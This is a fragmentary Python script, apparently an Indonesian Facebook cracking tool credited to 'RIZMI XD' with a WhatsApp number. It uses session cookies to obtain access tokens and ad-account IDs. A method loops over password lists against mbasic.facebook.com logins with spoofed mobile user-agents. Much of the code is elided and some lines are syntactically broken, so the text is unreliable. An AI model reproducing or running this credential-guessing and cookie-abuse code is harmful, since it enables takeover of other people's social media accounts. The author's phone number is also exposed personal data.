...
def logo():
 ...
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║META FACEBOOK METHOD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : RIZMI XD               {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : 085348550628         {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/RIZMIXD{N}  ║")
...
def login_cookie():
    ...
    try:
        ...
        header = {"Host":"m.facebook.com", "origin":"https://mbasic.facebook.com", "upgrade-insecure-requests" : "1",
        ...
        cin = session.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
        ...
        yan = session.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header, allow_redirects = False)
        if 'c_user' in session.cookies.get_dict():
            ...
            #ikeh = ewee.get('ikeh')
            token = ewee.get('token')
            nama = session.get(f"https://m.facebook.com/me?access_token={token}").json()["name"]
...
def ubah_cok(cookie):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 5.0.2; Elephone P7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.45 Mobile Safari/537.36',
        'Cookie': cookie
    }
    with requests.Session() as r:
      req = r.get('https://m.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
      cari_id = re.findall('act=(.*?)&nav_source', req.text)
      for z in cari_id:
          rex = r.get(f'https://m.facebook.com/adsmanager/manage/campaigns?act={z}&nav_source=no_referrer', headers = headers)
...
def ngomen_post(hencet, token):
    try:
        kontol= requests.get(cookies=token,headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}).text.encode("utf-8")
        memek = BeautifulSoup('html.parser')
    ...
    def __metode__(self, cebok, user, pasw):
        ...
        try:
            for pw in pasw:
                ...
                session.headers.update({'Host':'mbasic.facebook.com': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
